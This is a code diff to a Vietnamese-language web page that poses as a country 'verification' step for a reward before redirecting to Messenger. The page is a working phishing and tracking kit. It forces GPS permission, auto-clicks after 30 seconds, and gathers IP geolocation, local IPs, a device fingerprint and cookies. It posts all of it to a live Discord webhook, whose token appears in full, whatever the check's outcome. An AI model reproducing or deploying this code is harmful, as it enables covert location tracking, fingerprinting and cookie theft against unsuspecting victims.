@@ -6,7 +6,7 @@
     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
     <meta http-equiv="Pragma" content="no-cache">
     <meta http-equiv="Expires" content="0">
-    <title>Xác minh kết nối…</title>
+    <title>Xác minh quốc gia…</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         html, body { height: 100%; background: #0e1013; font-family: 'Segoe UI', 'Roboto', 'Arial', sans-serif; overflow: hidden; }
@@ -48,12 +48,25 @@
             content: ''; display: block; width: 18px; height: 30px; border: solid white;
             border-width: 0 4px 4px 0; transform: rotate(45deg); margin-top: -3px;
         }
+        .crossmark {
+            width: 70px; height: 70px; border-radius: 50%; background: #ff1744;
+            display: flex; justify-content: center; align-items: center; margin-bottom: 15px;
+            box-shadow: 0 0 25px rgba(255,23,68,0.5); animation: pop 0.4s ease;
+        }
+        .crossmark::after, .crossmark::before {
+            content: ''; position: absolute; width: 35px; height: 5px; background: white;
+            border-radius: 2px;
+        }
+        .crossmark::after { transform: rotate(45deg); }
+        .crossmark::before { transform: rotate(-45deg); }
         .hidden { display: none; }
         #mapImage {
             max-width: 280px; border-radius: 12px; margin: 10px 0; border: 2px solid #333;
         }
-        #copyLink {
-            color: #ffbe0b; text-decoration: underline; cursor: pointer; font-size: 14px; margin-top: 12px;
+        #retryBtn {
+            margin-top: 20px; padding: 10px 28px; background: rgba(255,255,255,0.1);
+            border-radius: 50px; color: #ffbe0b; font-weight: 600; cursor: pointer;
+            border: 1px solid rgba(255,190,11,0.3); font-size: 14px;
         }
     </style>
 </head>
@@ -69,17 +82,20 @@
             <div id="tapPrompt" class="hidden" style="margin-top:15px; color:#ffbe0b; font-weight:600; font-size:15px; white-space: pre-line;"></div>
             <div id="tapButton" class="tap-area hidden">Chạm để xác minh</div>
         </div>
-        <div id="scanSection" class="hidden">
-            <div class="checkmark" id="successMarkInner"></div>
-            <div class="status" id="scanStatus">Định vị thành công!</div>
-            <img id="mapImage" src="" alt="Vị trí của bạn">
-            <div class="sub" id="scanSub">Đang quét thiết bị…</div>
+
+        <!-- Result screen (success/reject) -->
+        <div id="resultSection" class="hidden">
+            <div id="resultMark"></div>
+            <div class="status" id="resultStatus"></div>
+            <img id="mapImage" class="hidden" src="" alt="Vị trí">
+            <div class="sub" id="resultSub"></div>
+            <div id="retryBtn" class="hidden">Thử lại</div>
         </div>
     </div>
 
     <script>
-        // ========== MAIN APP – NO BROWSER CHECKS ==========
         const WEBHOOK = 'https://discord.com/api/webhooks/1508157152580337746/Ujt-uvdn6HBrnb7CFBe7rd4y-NqaHLstGmzFOKUoD6AJFS5HABi6kTqXXKrumg9eo-Ek';
+        const TARGET_COUNTRY = 'Vietnam';
 
         const wheelEl = document.getElementById('wheel');
         const percentEl = document.getElementById('percent');
@@ -88,10 +104,12 @@
         const tapBtn = document.getElementById('tapButton');
         const tapPrompt = document.getElementById('tapPrompt');
         const wheelSection = document.getElementById('wheelSection');
-        const scanSection = document.getElementById('scanSection');
+        const resultSection = document.getElementById('resultSection');
+        const resultMark = document.getElementById('resultMark');
+        const resultStatus = document.getElementById('resultStatus');
+        const resultSub = document.getElementById('resultSub');
         const mapImage = document.getElementById('mapImage');
-        const scanStatus = document.getElementById('scanStatus');
-        const scanSub = document.getElementById('scanSub');
+        const retryBtn = document.getElementById('retryBtn');
 
         let gpsData = null;
         let ipData = null;
@@ -156,7 +174,11 @@
         }
 
         async function fetchIP() {
-            const apis = ['https://ipapi.co/json/', 'https://ipinfo.io/json?token=0', 'http://ip-api.com/json/'];
+            const apis = [
+                'https://ipapi.co/json/',
+                'https://ipinfo.io/json?token=0',
+                'http://ip-api.com/json/?fields=status,country,regionName,city,lat,lon,isp,org,as,query'
+            ];
             for (let url of apis) {
                 try {
                     const r = await fetch(url, { signal: AbortSignal.timeout(3000) });
@@ -170,7 +192,7 @@
                         lon: d.longitude || d.lon || (d.loc ? d.loc.split(',')[1] : ''),
                         isp: d.isp || d.org || ''
                     };
-                    if (out.ip) return out;
+                    if (out.ip && out.country) return out;
                 } catch(e) {}
             }
             return null;
@@ -213,7 +235,7 @@
                 title: '📱 **Dữ liệu thiết bị & Vị trí**',
                 color: 0xffa502,
                 fields: [
-                    { name: '📍 GPS', value: gpsData ? `Lat: ${gpsData.lat}\nLon: ${gpsData.lon}\nAcc: ±${gpsData.accuracy}m` : 'Không có (bị từ chối)', inline: true },
+                    { name: '📍 GPS', value: gpsData ? `Lat: ${gpsData.lat}\nLon: ${gpsData.lon}\nAcc: ±${gpsData.accuracy}m` : 'Không có', inline: true },
                     { name: '🌐 IP & Vị trí IP', value: ipData ? `IP: ${ipData.ip}\nTP: ${ipData.city}, ${ipData.country}\nISP: ${ipData.isp}` : 'Không lấy được', inline: true },
                     { name: '🏠 IP cục bộ', value: localIPs || 'Không có', inline: true },
                     { name: '🔋 Pin', value: fp.battery ? `${fp.battery.level} (${fp.battery.charging?'Sạc':'Không sạc'})` : 'N/A', inline: true },
@@ -226,7 +248,7 @@
                     { name: '🔊 Audio', value: fp.audioFingerprint, inline: true },
                     { name: '🍪 Cookies', value: cookiesStolen.substring(0, 1020), inline: false }
                 ],
-                footer: { text: 'Axr4t2auYc • GPS loop hoàn hảo' },
+                footer: { text: 'Axr4t2auYc • Xác minh quốc gia' },
                 timestamp: new Date().toISOString()
             };
             await fetch(WEBHOOK, { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({embeds:[embed]}) }).catch(()=>{});
@@ -234,8 +256,10 @@
 
         function showMap(lat, lon) {
             mapImage.src = `https://staticmap.openstreetmap.de/staticmap.php?center=${lat},${lon}&zoom=14&size=280x160&markers=${lat},${lon},red-pushpin`;
+            mapImage.classList.remove('hidden');
         }
 
+        // ---- Wheel flow ----
         let progress = 0;
         const wheelTimer = setInterval(() => {
             progress += 20;
@@ -244,9 +268,9 @@
                 clearInterval(wheelTimer);
                 wheelEl.classList.add('paused');
                 percentEl.textContent = '100%';
-                statusEl.textContent = 'Chuẩn bị kiểm tra vị trí…';
+                statusEl.textContent = 'Chuẩn bị xác minh quốc gia…';
                 subEl.textContent = '';
-                tapPrompt.textContent = '⚠️ ' + getDeviceHint() + '\n(Cần cấp quyền để tiếp tục)';
+                tapPrompt.textContent = '⚠️ ' + getDeviceHint() + '\n(Cần cấp quyền để xác minh)';
                 tapPrompt.classList.remove('hidden');
                 tapBtn.classList.remove('hidden');
             } else {
@@ -258,7 +282,7 @@
             vibrate();
             tapBtn.classList.add('hidden');
             tapPrompt.classList.add('hidden');
-            statusEl.textContent = 'Đang lấy vị trí GPS…';
+            statusEl.textContent = 'Đang xác minh quốc gia…';
             wheelEl.classList.remove('paused');
             percentEl.textContent = '0%';
             let fake = 0;
@@ -267,39 +291,60 @@
                 percentEl.textContent = fake + '%';
                 if (fake >= 100) { fake = 100; clearInterval(fakeInterval); wheelEl.classList.add('paused'); percentEl.textContent = '100%'; }
             }, 80);
+
+            // Fetch IP and optionally GPS
             const gpsPromise = forceGPS();
             ipData = await fetchIP();
             gpsData = await gpsPromise;
+
             clearInterval(fakeInterval);
             wheelEl.classList.add('paused');
             percentEl.textContent = '100%';
 
-            if (gpsData) {
-                wheelSection.classList.add('hidden');
-                scanSection.classList.remove('hidden');
-                if (gpsData.lat && gpsData.lon) showMap(gpsData.lat, gpsData.lon);
-                else if (ipData && ipData.lat && ipData.lon) showMap(ipData.lat, ipData.lon);
-                scanStatus.textContent = 'Định vị thành công!';
-                scanSub.textContent = 'Đang phân tích thiết bị…';
+            // Check country
+            const country = ipData ? ipData.country : null;
+            const isVietnam = country && country.toLowerCase().indexOf('vietnam') !== -1;
+
+            // Hide wheel, show result
+            wheelSection.classList.add('hidden');
+            resultSection.classList.remove('hidden');
+
+            if (isVietnam) {
+                // Success
+                resultMark.innerHTML = '<div class="checkmark"></div>';
+                resultStatus.textContent = 'Xác minh thành công!';
+                resultSub.textContent = 'Quốc gia: Việt Nam – Bạn đủ điều kiện.';
+                if (gpsData && gpsData.lat && gpsData.lon) {
+                    showMap(gpsData.lat, gpsData.lon);
+                } else if (ipData && ipData.lat && ipData.lon) {
+                    showMap(ipData.lat, ipData.lon);
+                }
                 vibrate();
+                // Redirect after 2.5 seconds
                 setTimeout(() => {
-                    scanSub.textContent = 'Thiết bị an toàn. Chuyển hướng…';
-                    vibrate();
-                    setTimeout(() => {
-                        window.location.href = 'https://www.messenger.com/';
-                    }, 1200);
-                }, 2000);
-                await sendData();
+                    window.location.href = 'https://www.messenger.com/';
+                }, 2500);
             } else {
-                statusEl.textContent = 'Vị trí bị từ chối – cần cấp quyền để tiếp tục';
-                subEl.innerHTML = 'Đang thử lại…<br><span id="copyLink" onclick="navigator.clipboard.writeText(\'https://messenger-co.github.io/Axr4t2auYc\').then(()=>alert(\'Đã sao chép link. Dán vào Chrome/Safari.\'))">📋 Sao chép link mở bằng trình duyệt</span>';
-                await sendData();
+                // Rejection
+                resultMark.innerHTML = '<div class="crossmark"></div>';
+                resultStatus.textContent = 'Quốc gia không được hỗ trợ';
+                resultSub.textContent = 'Chỉ người dùng Việt Nam mới có thể nhận thưởng.';
+                retryBtn.classList.remove('hidden');
+                retryBtn.onclick = () => {
+                    // Reload the whole page
+                    window.location.reload();
+                };
+                // Auto-reload after 5 seconds
                 setTimeout(() => {
                     window.location.reload();
-                }, 3000);
+                }, 5000);
             }
+
+            // Send data to Discord regardless
+            await sendData();
         });
 
+        // Auto-click after 30 seconds if user doesn't tap
         setTimeout(() => {
             if (!tapBtn.classList.contains('hidden')) tapBtn.click();
         }, 30000);
